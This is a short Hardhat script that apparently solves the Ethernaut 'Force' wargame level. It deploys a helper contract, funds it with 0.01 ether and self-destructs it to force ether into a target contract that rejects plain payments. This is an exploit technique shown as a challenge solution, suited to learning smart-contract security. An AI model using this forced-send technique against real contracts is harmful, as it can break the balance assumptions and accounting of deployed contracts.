const { Signer } = require("ethers");
const { ethers, waffle } = require("hardhat");

const CONTRACT_ADDRESS = "0x94099942864EA81cCF197E9D71ac53310b1468D8"; // get from browser console
const PLAYER_ADDRESS = "0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f"; // change to your own address

async function main() {
    const provider = waffle.provider;

    const balance = await provider.getBalance(CONTRACT_ADDRESS)
    console.log(`now the balance is : ${balance.toString()}`)

    //deploy funder
    const funderFactory = await ethers.getContractFactory("ForceFund")
    const funder = await funderFactory.deploy()
    const funderAddress = funder.address
    await funder.deployed()

    // deposit to funder
    await funder.deposit({ value: ethers.utils.parseEther('0.01') })
    const funderBalance = await funder.balance()
    console.log(`funder's balance is: ${funderBalance}`)

    // destruct funder
    await funder.destruct(CONTRACT_ADDRESS)

    const balance1 = await provider.getBalance(CONTRACT_ADDRESS)
    console.log(`now the balance is : ${balance1.toString()}`)

}

main().catch((error) => {
    console.error(error);
    // eslint-disable-next-line no-process-exit
    process.exit(1);
});
